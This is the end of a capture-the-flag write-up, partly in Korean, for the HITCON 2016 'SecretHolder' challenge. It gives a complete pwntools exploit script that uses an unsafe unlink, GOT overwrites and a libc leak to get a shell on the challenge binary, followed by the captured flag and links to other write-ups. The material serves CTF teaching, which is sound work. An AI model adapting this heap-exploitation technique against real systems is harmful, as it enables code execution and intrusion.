renew("small",secret)
renew("big",p64(systemAddr))		#bin.got['atoi']:bin.plt['atoi'] -> system()

p.send("sh")

p.interactive()
```

## **Exploit Code**

```python title="Exploit Code"
from pwn import *

def keep(size):
    p.recvuntil("3. Renew secret\n")
    p.sendline("1")
    p.recvuntil("3. Huge secret\n")
    p.sendline(size_num[size])
    p.recvuntil(":")
    p.send(size)

def wipe(size):
    p.recvuntil("3. Renew secret\n")
    p.sendline("2")
    p.recvuntil("3. Huge secret\n")
    p.sendline(size_num[size])
def renew(size,content):
    p.recvuntil("3. Renew secret\n")
    p.sendline("3")
    p.recvuntil("3. Huge secret\n")
    p.sendline(size_num[size])
    p.recvuntil(":")
    p.send(content)

p = process('./SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8', env={'LD_PRELOAD': './libc.so.6_375198810bb39e6593a968fcbcf6556789026743'})
bin = ELF('./SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8')
libc = ELF("libc.so.6_375198810bb39e6593a968fcbcf6556789026743")

size_num = { "small" : "1", "big" : "2", "huge" : "3" }

GlobalSmall = 0x6020B0
GlobalBig = 0x6020A0

log.info("free got : " + str(hex(bin.got['free'])))
log.info("read got : " + str(hex(bin.got['read'])))
log.info("puts plt : " + str(hex(bin.plt['puts'])))
log.info("atoi got : " + str(hex(bin.got['atoi'])))
log.info("read offset : " + str(hex(libc.symbols['read'])))
log.info("system offset : " + str(hex(libc.symbols['system'])))

keep("small")
wipe("small")
keep("big")
wipe("small")
keep("small")
keep("huge")
wipe("huge")
keep("huge")

#Unsafe unlink (Write to heap area)
secret = p64(0)
secret += p64(49)
secret += p64(GlobalSmall - 0x18)
secret += p64(GlobalSmall - 0x10)
secret += p64(32)
secret += p64(400016)
renew("big",secret)
wipe("huge")

#Overwrite to global variable
secret = "A"*8 						#0x602098
secret += p64(bin.got['free'])		#GlobalBig  [0x6020a0]:0x603010 -> bin.got['free']
secret += "A" * 8 					#GlobalHuge [0x6020a8]:0x603040 -> "A" * 8
secret += p64(GlobalBig)			#GlobalSmall[0x6020b0]:0x602098 -> 0x6020a0
renew("small",secret)

#Overwrite to GOT of free()
renew("big",p64(bin.plt['puts']))	#bin.got['free']:bin.plt['free'] -> bin.plt['puts'])

#Overwrite to GlobalBig(Set the first argument value.)
renew("small",p64(bin.got['read']))	#GlobalBig  [0x6020a0]:bin.got['free'] -> bin.got['read']

#Call puts(GlobalBig:bin.got['read']) (Print GOT of read().)
wipe("big")
data = p.recvline()

#Leak addresss
readAddr = u64(data[:6] + '\x00\x00')
libcBase = readAddr - libc.symbols['read']
systemAddr = libcBase + libc.symbols['system']
log.info("read addr : " + hex(readAddr))
log.info("libc Base : " + hex(libcBase))
log.info("system addr : " + hex(systemAddr))

##Overwrite to global variable (Write to stack area)
secret = p64(bin.got['atoi']) 		#GlobalBig  [0x6020a0]:bin.got['read'] -> bin.got['atoi']
secret += "A" * 8 					#GlobalHuge [0x6020a8]:"A" * 8 -> "A" * 8
secret += p64(GlobalBig) 			#GlobalSmall[0x6020b0]:0x6020a0 -> GlobalBig[0x6020a0]
secret += p64(1)					#GlobalBigFlag [0x6020b8]:0 -> 1
renew("small",secret)
renew("big",p64(systemAddr))		#bin.got['atoi']:bin.plt['atoi'] -> system()

p.send("sh")

p.interactive()
```

## **획득한 Flag 정보**

|  |  |
| --- | --- |
| Flag | hitcon&#123;The73 1s a s3C7e+ In malloc.c, h4ve y0u f0Und It?:P&#125; |

## **Related Site**

* <http://poning.me/2016/10/29/secret-holder/>
* <http://shift-crops.hatenablog.com/entry/2016/10/11/233559#Secret-Holder-Pwn-100>
* <https://github.com/mehQQ/public_writeup/blob/master/hitcon2016/SecretHolder/exp.py>